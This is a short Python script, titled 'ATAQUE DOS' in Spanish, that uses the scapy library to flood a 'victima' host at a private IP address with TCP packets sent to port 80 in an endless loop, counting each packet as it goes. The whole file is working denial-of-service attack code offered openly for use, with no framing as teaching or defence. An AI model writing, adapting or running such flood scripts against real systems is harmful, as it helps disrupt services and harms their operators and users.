#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                                ATAQUE DOS

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

from scapy.all import *

src = '192.168.1.7'
victima = '192.168.98.129'
puerto = '80'
numero_paquete = 1

while True:
    IP_ataque = IP(src=src,dst=victima)
    TCP_ataque = TCP(sport=int(puerto), dport=80)
    pkt = IP_ataque/TCP_ataque
    send(pkt,inter = .001)
    print ("Paquete enviado numero: ", numero_paquete)
    numero_paquete = numero_paquete + 1
